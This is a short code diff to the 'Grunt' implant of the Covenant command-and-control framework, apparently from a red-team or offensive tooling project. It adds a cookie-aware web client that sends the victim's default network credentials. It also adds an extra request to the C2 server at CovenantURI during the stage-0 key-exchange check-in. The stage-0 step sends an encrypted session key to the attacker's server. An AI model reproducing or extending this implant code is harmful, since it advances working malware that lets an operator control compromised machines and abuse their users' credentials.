@@ -57,9 +57,11 @@ namespace Grunt
                 byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
 
                 string Stage0Body = String.Format(MessageFormat, Id, Name, "0", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));
-                WebClient wc = new WebClient();
+                CookieWebClient wc = new CookieWebClient();
+                wc.UseDefaultCredentials = true;
                 wc.Proxy = WebRequest.DefaultWebProxy;
                 wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
+                wc.DownloadString(CovenantURI + ProfileHttpUrls[randomUrl.Next(ProfileHttpUrls.Count)]);
                 for(int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]); }
                 if (CovenantCertHash != "")
                 {
@@ -148,6 +150,23 @@ namespace Grunt
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message); }
         }
+
+        public class CookieWebClient : WebClient
+        {
+            public CookieContainer CookieContainer { get; private set; }
+            public CookieWebClient()
+            {
+                this.CookieContainer = new CookieContainer();
+            }
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var request = base.GetWebRequest(address) as HttpWebRequest;
+                if (request == null) return base.GetWebRequest(address);
+                request.CookieContainer = CookieContainer;
+                return request;
+            }
+        }
+
         private static string Parse(string data, string format)
         {
             format = Regex.Escape(format).Replace("\\{", "{");
